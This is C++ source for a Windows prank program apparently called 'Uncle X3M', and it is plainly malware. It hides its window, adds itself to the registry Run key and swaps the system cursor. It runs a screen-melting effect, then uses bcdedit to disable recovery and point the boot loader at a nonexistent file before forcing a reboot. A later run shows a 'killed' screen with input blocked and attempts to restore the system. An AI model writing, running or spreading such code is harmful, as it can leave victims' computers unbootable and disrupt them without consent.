#include <windows.h>
#include <iostream>
#include <fstream>
#include <string>

#pragma comment(lib, "winmm.lib")

void CorruptBootConfiguration() {
    system("bcdedit /set {default} recoveryenabled No");
    system("bcdedit /set {default} bootstatuspolicy displayallfailures");
    system("bcdedit /set {default} path \\windows\\system32\\winload_X3M.exe");
}

void RepairBootConfiguration() {
    system("bcdedit /set {default} path \\windows\\system32\\winload.exe");
    system("bcdedit /set {default} recoveryenabled Yes");
    system("bcdedit /set {default} bootstatuspolicy ignoreallfailures");
}

void AddToStartup() {
    HKEY hKey;
    TCHAR szPath[MAX_PATH];
    GetModuleFileName(NULL, szPath, MAX_PATH);
    if (RegOpenKeyEx(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueEx(hKey, L"SystemUncleX3M", 0, REG_SZ, (BYTE*)szPath, (lstrlen(szPath) + 1) * sizeof(TCHAR));
        RegCloseKey(hKey);
    }
}

void RemoveFromStartup() {
    HKEY hKey;
    if (RegOpenKeyEx(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegDeleteValue(hKey, L"SystemUncleX3M");
        RegCloseKey(hKey);
    }
}

void SetCursorToX() {
    HCURSOR hCursor = LoadCursor(NULL, IDC_CROSS);
    SetSystemCursor(hCursor, ACR_STARTUP);
}

void RestoreCursor() {
    SystemParametersInfo(SPI_SETCURSORS, 0, NULL, SPIF_SENDCHANGE);
}

void ScreenMelting(int duration_ms) {
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);
    HDC hdc = GetDC(NULL);
    int elapsed = 0;
    while (elapsed < duration_ms) {
        int x = rand() % screenWidth;
        int y = rand() % 5;
        int width = rand() % (screenWidth / 2);
        BitBlt(hdc, x, y, width, screenHeight, hdc, x, 0, SRCCOPY);
        Sleep(10);
        elapsed += 10;
        if (elapsed % 100 == 0) Beep(rand() % 1000 + 200, 10);
    }
    ReleaseDC(NULL, hdc);
}

void ShowKillScreen() {
    BlockInput(TRUE);
    HDC hdc = GetDC(NULL);
    HBRUSH brush = CreateSolidBrush(RGB(0, 0, 0));
    RECT rect = { 0, 0, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN) };
    FillRect(hdc, &rect, brush);
    SetTextColor(hdc, RGB(255, 0, 0));
    SetBkMode(hdc, TRANSPARENT);
    HFONT hFont = CreateFont(50, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE, ANSI_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY, DEFAULT_PITCH | FF_SWISS, L"Impact");
    SelectObject(hdc, hFont);
    std::wstring text = L"Your Pc has been KILLED BY YOUR UNCLE X3M";
    DrawText(hdc, text.c_str(), -1, &rect, DT_CENTER | DT_VCENTER | DT_SINGLELINE);
    Sleep(5000);
    DeleteObject(hFont);
    DeleteObject(brush);
    ReleaseDC(NULL, hdc);
    BlockInput(FALSE);
}

const std::string counterFile = "C:\\Windows\\Temp\\u3m_logic.dat";

int GetCounter() {
    std::ifstream file(counterFile);
    int count = 0;
    if (file.is_open()) { file >> count; file.close(); }
    return count;
}

void UpdateCounter(int count) {
    std::ofstream file(counterFile);
    if (file.is_open()) { file << count; file.close(); }
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    int currentCount = GetCounter();
    if (currentCount == 0) {
        UpdateCounter(1);
        AddToStartup();
        SetCursorToX();
        ScreenMelting(20000);
        CorruptBootConfiguration();
        system("shutdown /r /t 5 /f");
    }
    else if (currentCount == 1) {
        UpdateCounter(2);
        RepairBootConfiguration();
        ShowKillScreen();
        system("shutdown /r /t 3 /f");
    }
    else {
        RepairBootConfiguration();
        RestoreCursor();
        RemoveFromStartup();
        remove(counterFile.c_str());
        MessageBox(NULL, L"System Restored Perfectly. Welcome back to Life!", L"Uncle X3M", MB_OK | MB_ICONINFORMATION);
    }
    return 0;
}